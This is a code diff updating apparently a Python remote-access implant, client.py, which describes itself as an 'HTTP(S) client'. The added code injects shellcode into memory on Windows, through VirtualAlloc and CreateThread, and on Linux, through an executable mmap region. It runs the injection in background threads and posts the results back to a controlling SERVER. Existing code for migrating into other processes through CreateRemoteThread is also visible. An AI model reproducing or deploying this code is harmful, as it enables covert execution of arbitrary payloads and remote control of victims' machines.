@@ -2,11 +2,13 @@
 # -*- coding: utf-8 -*-
 
 __author__      = 'Christophoros Petrou (game0ver)'
-__version__     = '1.2'
+__version__     = '1.3'
 
 import os
 import re
 import sys
+import mmap
+import time
 import socket
 import platform
 import warnings
@@ -27,6 +29,7 @@ from argparse import (
 )
 from ctypes import *
 from random import randint
+from threading import Thread
 from requests import Session
 from requests.exceptions import *
 warnings.filterwarnings("ignore")
@@ -50,7 +53,8 @@ except NameError:
 
 CERT = None
 SERVER = None
-shellcode =  b""
+shellcode = b""
+
 
 def console():
     parser = ArgumentParser(description="{}client.py:{} An HTTP(S) client with advanced features.".format('\033[1m', '\033[0m'),
@@ -138,16 +142,6 @@ def abs_path(file):
 def is_os_64bit():
     return platform.machine().endswith('64')
 
-def inject_shellcode():
-    try:
-        arg_address = kernel32.VirtualAlloc(0, len(shellcode), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
-        kernel32.RtlMoveMemory(arg_address, shellcode, len(shellcode))
-        thrd = kernel32.CreateThread(0, 0, arg_address, 0, 0, 0)
-        kernel32.WaitForSingleObject(thrd,-1)
-        return True
-    except Exception as error:
-        return error
-
 def migrate_res(pid, retcode):
     result = {
         1 : "Shellcode successfully injected on PID: {} ".format(pid),
@@ -169,6 +163,38 @@ def migrate_to_pid(pid):
         return 3 if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(c_ulong(0))) else 1
     except Exception as error:
         return 3
+
+# For now works on both linux x86/x64 bit :)
+# taken from: https://github.com/thomaskeck/PyShellCode
+def create_shellcode_Func(restype=c_int64, argtypes=()):
+    if not is_os_64bit():
+        restype = c_int32
+    mm = mmap.mmap(-1, len(shellcode), flags=mmap.MAP_SHARED | mmap.MAP_ANONYMOUS, prot=mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC)
+    mm.write(shellcode)
+    ctypes_buffer = c_int.from_buffer(mm)
+    function = CFUNCTYPE(restype, *argtypes)(addressof(ctypes_buffer))
+    function._avoid_gc_for_mmap = mm
+    return function
+
+def inject_shellcode_unix(s):
+    try:
+        shellcode_injection = create_shellcode_Func()
+        shellcode_injection()
+    except Exception as error:
+        s.post(SERVER,
+            data='Shellcode injection failed...\nERROR: {}'.format(error)
+        )
+
+def inject_shellcode_windows(s):
+    try:
+        arg_address = kernel32.VirtualAlloc(0, len(shellcode), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
+        kernel32.RtlMoveMemory(arg_address, shellcode, len(shellcode))
+        thrd = kernel32.CreateThread(0, 0, arg_address, 0, 0, 0)
+        s.post(SERVER, data="Shellcode injected successfully...")
+        kernel32.WaitForSingleObject(thrd,-1)
+    except Exception as error:
+        s.post(SERVER, data=error)
+
 
 username, error = exec_cmd("whoami")
 if os.name=='nt':
@@ -280,17 +306,30 @@ try:
                         if os.name == 'nt':
                             if not is_os_64bit():
                                 if shellcode:
-                                    res = inject_shellcode()
-                                    if res == True:
-                                        s.post(SERVER, data="Shellcode injected successfully...")
-                                    else:
-                                        s.post(SERVER, data=res) # res in this case is the error...
+                                    t = Thread(target=inject_shellcode_windows,
+                                        args=(s,)
+                                    )
+                                    t.daemon = True
+                                    t.start()
+                                    time.sleep(1)
                                 else:
                                     s.post(SERVER, data='No shellcode specified...')
+                            else:
+                                s.post(SERVER,
+                                    data='For now "inject shellcode" command is available only for 32bit-windows systems.'
+                                )
                         else:
-                            s.post(SERVER,
-                                data='For now "inject shellcode" command is available only for 32bit-windows systems.'
-                            )
+                            if shellcode:
+                                t = Thread(target=inject_shellcode_unix,
+                                    args=(s,)
+                                )
+                                t.daemon = True
+                                t.start()
+                                time.sleep(1)
+                            else:
+                                s.post(SERVER,
+                                    data='No shellcode specified...'
+                                )
                     elif migrate.match(cmd):
                         if os.name == 'nt':
                             if not is_os_64bit():
